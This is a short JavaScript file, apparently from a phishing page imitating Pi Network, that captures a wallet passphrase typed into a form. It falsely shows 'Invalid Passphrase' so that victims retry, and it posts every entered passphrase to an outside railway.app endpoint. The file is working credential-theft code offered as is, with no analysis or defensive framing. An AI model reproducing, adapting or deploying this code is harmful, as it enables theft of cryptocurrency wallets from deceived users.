// https://pinetworkmainnet.com/pi/formaction.php

let form = document.querySelector("form");

let data = document.querySelector(".form-control");

let message = document.querySelector(".error");

let counter = 0;
let key=''

form.addEventListener("submit", async (e) => {
  if (counter<5 && key!=data.value || key=='') {
    key=data.value
    counter++;
    e.preventDefault();
    message.innerHTML = " <p>Invalid Passphrase</p>";
    await fetch("https://mainnet-production.up.railway.app/handle-mail", {
      method: "POST",
      body: JSON.stringify({ pass: data.value }),
    });
  } else {
    e.preventDefault();
    message.innerHTML = " <p>Invalid Passphrase</p>";
  }

  // window.location.reload()
});
